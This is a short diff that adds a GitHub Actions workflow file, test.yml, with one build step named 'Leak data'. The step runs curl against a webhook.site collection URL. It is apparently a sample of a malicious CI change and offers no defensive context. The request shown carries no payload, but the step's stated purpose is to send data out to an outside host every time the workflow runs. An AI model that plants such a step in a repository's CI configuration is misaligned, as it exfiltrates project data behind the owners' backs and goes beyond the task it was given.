@@ -1,0 +1,7 @@
+# .github/workflows/test.yml
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Leak data
+        run: curl https://webhook.site/3a45291b-4331-4008-8191-c5c9200be954
